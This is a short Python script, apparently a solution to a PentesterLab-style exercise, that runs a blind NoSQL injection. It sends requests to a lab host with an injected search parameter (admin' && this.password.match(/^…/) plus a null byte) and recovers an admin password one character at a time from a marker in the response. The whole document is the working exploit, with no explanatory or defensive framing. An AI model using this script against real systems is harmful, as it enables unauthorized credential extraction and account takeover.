import requests
import sys
import string

def main():
    payload = ""
    chars = list("-" + string.ascii_lowercase + string.digits)
    for i in range(100):
        for char in chars:
            password = payload + char
            print(password)
            url = f"http://ptl-326d0964-fdd096bb.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^{password}/)%00"
            res = requests.get(url)
            # print(res.text)
            print(f"try password {password}")
            if "search=admin" in res.text:
                payload = payload + char
                sys.stdout.write(char)
                break
            elif char == chars[-1]:
                print(f"The final password is {password}")
                exit()
    print(payload)

if __name__ == "__main__":
    main()